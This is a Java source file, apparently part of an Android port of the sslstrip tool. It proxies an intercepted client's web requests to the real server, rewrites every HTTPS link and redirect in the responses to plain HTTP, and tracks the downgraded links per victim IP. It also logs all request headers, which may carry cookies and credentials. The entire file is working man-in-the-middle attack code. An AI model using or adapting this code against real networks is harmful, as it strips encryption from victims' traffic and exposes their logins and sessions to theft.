package com.crazyricky.androidsslstrip.sslstrip;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.StringWriter;
import java.io.Writer;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;

import com.crazyricky.androidsslstrip.Logging;
import com.crazyricky.androidsslstrip.NanoHTTPD.Response;

public class ServerConnection {
    Pattern urlExpression = Pattern.compile("(https://[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)", Pattern.CASE_INSENSITIVE);
    Pattern urlType = Pattern.compile("https://", Pattern.CASE_INSENSITIVE);
    Pattern urlExplicitPort = Pattern.compile("https://([a-zA-Z0-9.]+):[0-9]+/", Pattern.CASE_INSENSITIVE);

    private boolean isImageRequest = false;
    private boolean isCompressed = false;
    protected String mClientIP;
    protected String mTargetURL;

    public ServerConnection(String clientIP, String url) {
        this.mClientIP = clientIP;
        this.mTargetURL = url;
    }

    public Response sendViaHttp(String method, Properties header, byte[] content) {
        URL uri;
        try {
            uri = new URL(mTargetURL);
            Logging.updateDebug("fullUri:" + mTargetURL);
            HttpURLConnection.setFollowRedirects(false);
            HttpURLConnection uc = (HttpURLConnection) uri.openConnection();
            uc.setRequestMethod(method);

            Logging.updateDebug("method:" + method);
            for (Iterator<?> iter = header.keySet().iterator(); iter.hasNext();) {
                String key = (String) iter.next();
                uc.setRequestProperty(key, header.getProperty(key));
                Logging.updateDebug(key + ":" + header.getProperty(key));
            }

            if (content != null) {
                uc.setRequestProperty("Content-Length",
                        Integer.toString(content.length));
                DataOutputStream ds = new DataOutputStream(uc.getOutputStream());
                ds.write(content);
                ds.flush();
                ds.close();
            }

            uc.connect();

            String responseStatus = uc.getResponseCode() + " " + uc.getResponseMessage();
            Logging.updateDebug("response:" + responseStatus);
            Response res = new Response();
            res.status = responseStatus;
            res.mimeType = uc.getContentType();

            Map<String, List<String>> hdrs = uc.getHeaderFields();
            Set<String> hdrKeys = hdrs.keySet();
            for (String k : hdrKeys) {
                if (k != null) {
                    List<String> stringLst = hdrs.get(k);
                    for (String value : stringLst) {
                        handleHeader(res, k, value);
                    }
                }
            }
            handleResponse(res, uc.getInputStream());
            uc.disconnect();
            return res;
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    protected void handleHeader(Response res, String key, String value) {
        if (key.toLowerCase().equals("location")) {
            value = replaceSecureLinks(value);
        }

        if (key.toLowerCase().equals("content-type")) {
            if (value.contains("image")) {
                isImageRequest = true;
            }
        }

        if (key.toLowerCase().equals("content-encoding")) {
            if (value.contains("gzip")) {
                isCompressed = true;
            }
        } else if (key.toLowerCase().equals("content-length")) {

        } else {
            res.addHeader(key, value);
            Logging.updateDebug("header..." + key + ": " + value);
        }

    }

    public String convertStreamToString(InputStream is) throws IOException {
        if (is != null) {
            Writer writer = new StringWriter();

            char[] buffer = new char[1024];
            try {
                Reader reader = new BufferedReader(new InputStreamReader(is,
                        "UTF-8"));
                int n;
                while ((n = reader.read(buffer)) != -1) {
                    writer.write(buffer, 0, n);
                }
            } finally {
                is.close();
            }
            return writer.toString();
        } else {
            return "";
        }
    }

    private void handleResponse(Response res, InputStream is) {
        try {

            if (isCompressed) {
                is = new GZIPInputStream(is);
            }
            String fullMessage = "";

            if (isImageRequest) {
                res.data = (new CopyInputStream(is)).getCopy();
            } else {
                fullMessage = convertStreamToString(is);

                // todo:
                String data = replaceSecureLinks(fullMessage);

                try {
                    res.data = new ByteArrayInputStream(data.getBytes("UTF-8"));
                } catch (java.io.UnsupportedEncodingException uee) {
                    uee.printStackTrace();
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    protected String replaceSecureLinks(String data) {
        if (isImageRequest) {
            return data;
        }
        Matcher m = urlExpression.matcher(data);
        while (m.find()) {
            String url = m.group();
            Logging.updateDebug("Found secure reference: " + url);
            url = url.replaceFirst("https://", "http://");
            url = url.replace("&amp;", "&");

            URLMonitor.getInstance().addSecureLink(mClientIP, url);
        }

        m = urlExplicitPort.matcher(data);
        StringBuffer sb = new StringBuffer();
        boolean result = m.find();
        while (result) {
            m.appendReplacement(sb, "http://$1/");
            result = m.find();
        }
        m.appendTail(sb);

        m = urlType.matcher(sb);
        StringBuffer sb2 = new StringBuffer();
        result = m.find();
        while (result) {
            m.appendReplacement(sb2, "http://");
            result = m.find();
        }
        m.appendTail(sb2);

        return sb2.toString();

    }

    public static class CopyInputStream {
        private InputStream _is;
        private ByteArrayOutputStream _copy = new ByteArrayOutputStream();

        /**
             * 
             */
        public CopyInputStream(InputStream is) {
            _is = is;

            try {
                copy();
            } catch (IOException ex) {
                // do nothing
            }
        }

        private int copy() throws IOException {
            int read = 0;
            int chunk = 0;
            byte[] data = new byte[256];

            while (-1 != (chunk = _is.read(data))) {
                read += data.length;
                _copy.write(data, 0, chunk);
            }

            return read;
        }

        public InputStream getCopy() {
            return (InputStream) new ByteArrayInputStream(_copy.toByteArray());
        }
    }
}
